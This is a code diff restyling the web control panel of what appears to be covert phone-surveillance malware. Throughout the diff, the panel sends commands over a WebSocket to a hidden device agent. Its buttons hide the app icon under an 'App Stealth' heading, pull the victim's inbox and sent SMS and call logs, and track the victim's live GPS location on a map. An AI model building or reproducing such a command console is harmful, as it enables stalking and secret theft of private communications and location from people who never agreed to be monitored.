@@ -1,259 +1,219 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SystemSync Ultra Console</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+    <style>
+        /* ===== GLOBAL ===== */
+        body {
+            margin: 0;
+            background: linear-gradient(135deg, #050505, #0c0c0c);
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-<title>SystemSync Ultra Console</title>
+        /* ===== HEADER ===== */
+        .header {
+            height: 60px;
+            background: #000;
+            border-bottom: 1px solid #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 25px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
 
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+        .title {
+            font-size: 18px;
+            color: #00d2ff;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
 
-<style>
+        .status-badge {
+            padding: 6px 16px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 12px;
+            transition: all 0.3s ease;
+        }
 
-/* ===== GLOBAL ===== */
+        .online { background: #063b13; color: #69f0ae; border: 1px solid #69f0ae; box-shadow: 0 0 10px rgba(105, 240, 174, 0.2); }
+        .offline { background: #3b0606; color: #ff8a80; border: 1px solid #ff8a80; }
 
-body{
-    margin:0;
-    background:linear-gradient(135deg,#050505,#0c0c0c);
-    color:#e0e0e0;
-    font-family:'Segoe UI',sans-serif;
-    display:flex;
-    flex-direction:column;
-    height:100vh;
-    overflow:hidden;
-}
+        .net-info {
+            font-family: 'Courier New', monospace;
+            color: #64b5f6;
+            font-size: 13px;
+        }
 
-/* ===== HEADER ===== */
+        /* ===== MAIN LAYOUT ===== */
+        .main { flex: 1; display: flex; }
 
-.header{
-    height:60px;
-    background:#000;
-    border-bottom:1px solid #111;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    padding:0 25px;
-}
+        /* ===== CONTROL PANEL ===== */
+        .panel {
+            width: 300px;
+            background: #0d0d0d;
+            border-right: 1px solid #1a1a1a;
+            padding: 20px;
+            overflow-y: auto;
+        }
 
-.title{
-    font-size:20px;
-    color:#00d2ff;
-    font-weight:600;
-}
+        .section { margin-bottom: 30px; }
+        .section h3 {
+            margin: 0 0 15px 0;
+            font-size: 12px;
+            color: #555;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 1px solid #1a1a1a;
+            padding-bottom: 5px;
+        }
 
-.status-badge{
-    padding:6px 14px;
-    border-radius:20px;
-    font-weight:bold;
-}
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #222;
+            border-radius: 4px;
+            cursor: pointer;
+            background: #151515;
+            color: #ccc;
+            transition: 0.2s;
+            font-size: 13px;
+            text-align: left;
+            padding-left: 15px;
+        }
 
-.online{background:#063b13;color:#69f0ae;}
-.offline{background:#3b0606;color:#ff8a80;}
+        button:hover {
+            background: #1f1f1f;
+            color: #fff;
+            border-color: #00d2ff;
+        }
 
-.net-info{
-    font-family:monospace;
-    color:#64b5f6;
-}
+        .toggle-btn {
+            background: #00d2ff;
+            color: #000;
+            font-weight: bold;
+            text-align: center;
+            padding-left: 0;
+        }
 
-/* ===== MAIN LAYOUT ===== */
+        .toggle-btn.active {
+            background: #ff8a80;
+        }
 
-.main{
-    flex:1;
-    display:flex;
-}
+        /* ===== MOBILE VIEWER ===== */
+        .viewer {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle, #111 0%, #050505 100%);
+        }
 
-/* ===== CONTROL PANEL ===== */
+        .phone {
+            width: 360px;
+            height: 700px;
+            border-radius: 40px;
+            background: #000;
+            border: 12px solid #1a1a1a;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 0 50px rgba(0,0,0,0.8);
+        }
 
-.panel{
-    width:320px;
-    background:#0d0d0d;
-    border-right:1px solid #111;
-    padding:25px;
-    overflow-y:auto;
-}
+        .phone-header {
+            padding: 20px 10px 10px 10px;
+            background: #0a0a0a;
+            border-bottom: 1px solid #1a1a1a;
+            text-align: center;
+            font-size: 14px;
+            color: #00d2ff;
+            font-weight: bold;
+        }
 
-.section{
-    margin-bottom:28px;
-}
+        .phone-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 15px;
+            scrollbar-width: thin;
+            scrollbar-color: #333 #000;
+        }
 
-.section h3{
-    margin:0 0 10px 0;
-    font-size:14px;
-    color:#90caf9;
-    letter-spacing:1px;
-}
+        /* DATA CARDS */
+        .data-card {
+            background: #111;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-radius: 8px;
+            border: 1px solid #1a1a1a;
+            border-left: 4px solid #00d2ff;
+        }
 
-button{
-    width:100%;
-    padding:12px;
-    margin-bottom:8px;
-    border:none;
-    border-radius:8px;
-    cursor:pointer;
-    background:#151515;
-    color:white;
-    transition:.25s;
-    font-size:14px;
-}
+        .label { color: #555; font-size: 11px; text-transform: uppercase; font-weight: bold; display: block; }
+        .val { color: #ddd; font-size: 13px; margin-bottom: 5px; display: block; }
 
-button:hover{
-    background:#1f1f1f;
-    transform:translateY(-1px);
-}
-
-/* TOGGLE BUTTON */
-
-.toggle{
-    background:linear-gradient(135deg,#00d2ff,#3a7bd5);
-    color:black;
-    font-weight:600;
-}
-
-/* ===== MOBILE FRAME ===== */
-
-.viewer{
-    flex:1;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-}
-
-.phone{
-    width:380px;
-    height:720px;
-    border-radius:38px;
-    background:#000;
-    box-shadow:
-        0 0 60px rgba(0,210,255,.08),
-        inset 0 0 15px rgba(255,255,255,.05);
-    border:10px solid #111;
-    display:flex;
-    flex-direction:column;
-    overflow:hidden;
-}
-
-.phone-header{
-    padding:14px;
-    background:#070707;
-    border-bottom:1px solid #111;
-    text-align:center;
-    font-weight:600;
-}
-
-.phone-content{
-    flex:1;
-    overflow:auto;
-    padding:12px;
-}
-
-/* DATA CARDS */
-
-.data-card{
-    background:#111;
-    padding:10px;
-    margin-bottom:10px;
-    border-radius:6px;
-    border-left:3px solid #00d2ff;
-}
-
-.label{
-    color:#777;
-    font-size:12px;
-}
-
-/* MAP */
-
-#map{
-    height:100%;
-    width:100%;
-}
-
-.gps-info{
-    position:absolute;
-    top:0;
-    left:0;
-    width:100%;
-    padding:10px;
-    background:rgba(0,0,0,.75);
-    font-size:12px;
-}
-
-</style>
+        /* MAP */
+        #map { height: 100%; width: 100%; border-radius: 10px; }
+        .gps-overlay {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            background: rgba(0,0,0,0.85);
+            padding: 15px;
+            font-size: 12px;
+            border-top: 1px solid #00d2ff;
+            box-sizing: border-box;
+        }
+    </style>
 </head>
 
 <body>
 
 <div class="header">
-    <div class="title">SystemSync Command Center</div>
-
-    <div class="status-badge offline" id="connectionStatus">
-        DEVICE OFFLINE
-    </div>
-
-    <div class="net-info" id="networkInfo">
-        WAITING FOR NETWORK…
-    </div>
+    <div class="title">SystemSync <span style="color:#fff">Console</span></div>
+    <div class="net-info" id="networkInfo">OFFLINE MODE</div>
+    <div class="status-badge offline" id="connectionStatus">DEVICE DISCONNECTED</div>
 </div>
 
 <div class="main">
-
-    <!-- LEFT PANEL -->
     <div class="panel">
-
         <div class="section">
-            <h3>APP CONTROL</h3>
-
-            <!-- 🔥 TOGGLE BUTTON -->
-            <button id="toggleAppBtn"
-                    class="toggle"
-                    onclick="toggleApp()">
-                Hide App Icon
-            </button>
+            <h3>App Stealth</h3>
+            <button id="toggleAppBtn" class="toggle-btn" onclick="toggleApp()">Hide App Icon</button>
         </div>
 
         <div class="section">
-            <h3>COMMUNICATION</h3>
-
-            <button onclick="sendCommand('getSMS inbox')">
-                Inbox SMS
-            </button>
-
-            <button onclick="sendCommand('getSMS sent')">
-                Sent SMS
-            </button>
-
-            <button onclick="sendCommand('getCallLogs')">
-                Call Logs
-            </button>
+            <h3>Communication</h3>
+            <button onclick="sendCommand('getSMS inbox')">Fetch Inbox SMS</button>
+            <button onclick="sendCommand('getSMS sent')">Fetch Sent SMS</button>
+            <button onclick="sendCommand('getCallLogs')">Fetch Call Logs</button>
         </div>
 
         <div class="section">
-            <h3>TRACKING</h3>
-
-            <button onclick="sendCommand('getLocation')">
-                Live GPS Location
-            </button>
+            <h3>Geospatial</h3>
+            <button onclick="sendCommand('getLocation')">Track Live Location</button>
         </div>
-
     </div>
 
-    <!-- RIGHT MOBILE VIEW -->
     <div class="viewer">
-
         <div class="phone">
-
-            <div class="phone-header"
-                 id="outputHeader">
-                Output View
-            </div>
-
-            <div class="phone-content"
-                 id="outputContent">
-
-                <div style="text-align:center;color:#555;margin-top:50%;">
-                    Awaiting command…
+            <div class="phone-header" id="outputHeader">System Standby</div>
+            <div class="phone-content" id="outputContent">
+                <div style="text-align:center; color:#333; margin-top:60%;">
+                    <p>Select a module to begin data synchronization.</p>
                 </div>
-
             </div>
         </div>
     </div>
@@ -262,168 +222,150 @@ button:hover{
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <script>
+    // Automatically detect host for WebSocket
+    const ws = new WebSocket("wss://" + window.location.host);
 
-const ws = new WebSocket("wss://" + window.location.host);
+    let mapInstance = null;
+    let appHidden = false;
 
-let mapInstance=null;
-let appHidden=false;
-
-/* =========================
-   TOGGLE BUTTON
-========================= */
-
-function toggleApp(){
-
-    appHidden=!appHidden;
-
-    if(appHidden){
-        sendCommand('hideApp');
-        toggleAppBtn.innerText="Show App Icon";
-    }
-    else{
-        sendCommand('showApp');
-        toggleAppBtn.innerText="Hide App Icon";
-    }
-}
-
-/* =========================
-   SOCKET
-========================= */
-
-ws.onopen=()=>ws.send("I_AM_WEB");
-
-ws.onmessage=(event)=>{
-
-    const msg=event.data;
-
-    if(msg.startsWith("STATUS:")){
-        const status=msg.split(":")[1];
-        const badge=document.getElementById('connectionStatus');
-
-        badge.className=status==='ONLINE'
-            ?'status-badge online'
-            :'status-badge offline';
-
-        badge.innerText="DEVICE "+status;
+    // Toggle App Visibility logic
+    function toggleApp() {
+        appHidden = !appHidden;
+        const btn = document.getElementById('toggleAppBtn');
+        
+        if (appHidden) {
+            sendCommand('hideApp');
+            btn.innerText = "Show App Icon";
+            btn.classList.add('active');
+        } else {
+            sendCommand('showApp');
+            btn.innerText = "Hide App Icon";
+            btn.classList.remove('active');
+        }
     }
 
-    else if(msg.startsWith("NET_INFO:")){
-        networkInfo.innerText=msg.split(":")[1];
+    ws.onopen = () => {
+        ws.send("I_AM_WEB");
+        console.log("Connected to command server.");
+    };
+
+    ws.onmessage = (event) => {
+        const msg = event.data;
+
+        // Device Online/Offline handling
+        if (msg.startsWith("STATUS:")) {
+            const status = msg.split(":")[1];
+            const badge = document.getElementById('connectionStatus');
+            badge.className = (status === 'ONLINE') ? 'status-badge online' : 'status-badge offline';
+            badge.innerText = (status === 'ONLINE') ? 'DEVICE ONLINE' : 'DEVICE OFFLINE';
+        }
+
+        else if (msg.startsWith("NET_INFO:")) {
+            document.getElementById('networkInfo').innerText = msg.split(":")[1].toUpperCase();
+        }
+
+        else if (msg.startsWith("SMS_DATA:")) {
+            renderSMS(JSON.parse(msg.substring(9)));
+        }
+
+        else if (msg.startsWith("CALL_DATA:")) {
+            renderCalls(JSON.parse(msg.substring(10)));
+        }
+
+        else if (msg.startsWith("LOC_DATA:")) {
+            renderLocation(JSON.parse(msg.substring(9)));
+        }
+    };
+
+    function sendCommand(cmd) {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.send(cmd);
+            document.getElementById('outputContent').innerHTML = 
+                '<div style="text-align:center; padding:50px; color:#00d2ff;">Syncing Data...</div>';
+        } else {
+            alert("Connection Lost. Please refresh.");
+        }
     }
 
-    else if(msg.startsWith("SMS_DATA:")){
-        renderSMS(JSON.parse(msg.substring(9)));
+    function renderSMS(data) {
+        document.getElementById('outputHeader').innerText = "SMS MODULE";
+        const container = document.getElementById('outputContent');
+        container.innerHTML = "";
+
+        data.forEach(item => {
+            const card = document.createElement('div');
+            card.className = "data-card";
+            card.innerHTML = `
+                <span class="label">${item.type}</span>
+                <span class="val" style="color:#00d2ff">${item.number}</span>
+                <span class="val">${item.content}</span>
+                <span class="label" style="font-size:9px">${item.date}</span>
+            `;
+            container.appendChild(card);
+        });
     }
 
-    else if(msg.startsWith("CALL_DATA:")){
-        renderCalls(JSON.parse(msg.substring(10)));
+    function renderCalls(data) {
+        document.getElementById('outputHeader').innerText = "CALL LOG MODULE";
+        const container = document.getElementById('outputContent');
+        container.innerHTML = "";
+
+        data.forEach(item => {
+            const card = document.createElement('div');
+            card.className = "data-card";
+            card.innerHTML = `
+                <span class="label">${item.type}</span>
+                <span class="val" style="color:#00d2ff">${item.number}</span>
+                <span class="val">Duration: ${item.duration}</span>
+                <span class="label" style="font-size:9px">${item.date}</span>
+            `;
+            container.appendChild(card);
+        });
     }
 
-    else if(msg.startsWith("LOC_DATA:")){
-        renderLocation(JSON.parse(msg.substring(9)));
-    }
-};
+    function renderLocation(data) {
+        document.getElementById('outputHeader').innerText = "GEO-TRACKING";
+        const container = document.getElementById('outputContent');
+        container.innerHTML = "";
 
-function sendCommand(cmd){
-    ws.send(cmd);
-    outputContent.innerHTML=
-        '<div style="text-align:center;padding:20px;">Fetching Data...</div>';
-}
+        if (data.error) {
+            container.innerHTML = `<div style="color:#ff8a80; text-align:center;">${data.error}</div>`;
+            return;
+        }
 
-/* =========================
-   RENDERERS
-========================= */
+        // Map Wrapper
+        const mapDiv = document.createElement('div');
+        mapDiv.id = "map";
+        mapDiv.style.height = "100%";
+        container.appendChild(mapDiv);
 
-function renderSMS(data){
-
-    outputHeader.innerText="SMS Messages";
-    outputContent.innerHTML="";
-
-    data.forEach(sms=>{
-
-        const card=document.createElement('div');
-        card.className="data-card";
-
-        card.innerHTML=`
-            <div><span class="label">TYPE:</span> <b>${sms.type}</b></div>
-            <div><span class="label">FROM:</span> ${sms.number}</div>
-            <div><span class="label">MSG:</span> ${sms.content}</div>
-            <div><span class="label">TIME:</span> ${sms.date}</div>
+        // Data Overlay
+        const overlay = document.createElement('div');
+        overlay.className = "gps-overlay";
+        overlay.innerHTML = `
+            <div style="display:flex; justify-content:space-between;">
+                <span><b>LAT:</b> ${data.lat.toFixed(4)}</span>
+                <span><b>LON:</b> ${data.lon.toFixed(4)}</span>
+            </div>
+            <div style="margin-top:5px; color:#888;"><b>ACCURACY:</b> ${data.acc} meters</div>
         `;
+        container.appendChild(overlay);
 
-        outputContent.appendChild(card);
-    });
-}
-
-function renderCalls(data){
-
-    outputHeader.innerText="Call Logs";
-    outputContent.innerHTML="";
-
-    data.forEach(call=>{
-
-        const card=document.createElement('div');
-        card.className="data-card";
-
-        card.innerHTML=`
-            <div><span class="label">TYPE:</span> <b>${call.type}</b></div>
-            <div><span class="label">CONTACT:</span> ${call.number}</div>
-            <div><span class="label">DURATION:</span> ${call.duration}</div>
-            <div><span class="label">TIME:</span> ${call.date}</div>
-        `;
-
-        outputContent.appendChild(card);
-    });
-}
-
-function renderLocation(data){
-
-    outputHeader.innerText="GPS Tracking";
-    outputContent.innerHTML="";
-
-    if(data.error){
-        outputContent.innerHTML=`<div style="color:red;text-align:center;">${data.error}</div>`;
-        return;
+        // Initialize Map
+        setTimeout(() => {
+            if (mapInstance) mapInstance.remove();
+            mapInstance = L.map('map', { zoomControl: false }).setView([data.lat, data.lon], 16);
+            
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+            
+            L.marker([data.lat, data.lon]).addTo(mapInstance);
+            L.circle([data.lat, data.lon], {
+                radius: data.acc,
+                color: '#00d2ff',
+                fillOpacity: 0.1
+            }).addTo(mapInstance);
+        }, 200);
     }
-
-    const info=document.createElement('div');
-    info.className='gps-info';
-
-    info.innerHTML=`
-        <div><b>LAT:</b> ${data.lat}</div>
-        <div><b>LON:</b> ${data.lon}</div>
-        <div><b>ACCURACY:</b> ${data.acc} meters</div>
-    `;
-
-    outputContent.appendChild(info);
-
-    const mapDiv=document.createElement('div');
-    mapDiv.id="map";
-    outputContent.appendChild(mapDiv);
-
-    setTimeout(()=>{
-
-        if(mapInstance) mapInstance.remove();
-
-        mapInstance=L.map('map')
-            .setView([data.lat,data.lon],15);
-
-        L.tileLayer(
-            'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'
-        ).addTo(mapInstance);
-
-        L.marker([data.lat,data.lon])
-            .addTo(mapInstance);
-
-        L.circle([data.lat,data.lon],{
-            radius:data.acc,
-            color:'blue',
-            fillOpacity:.2
-        }).addTo(mapInstance);
-
-    },100);
-}
-
 </script>
 
 </body>
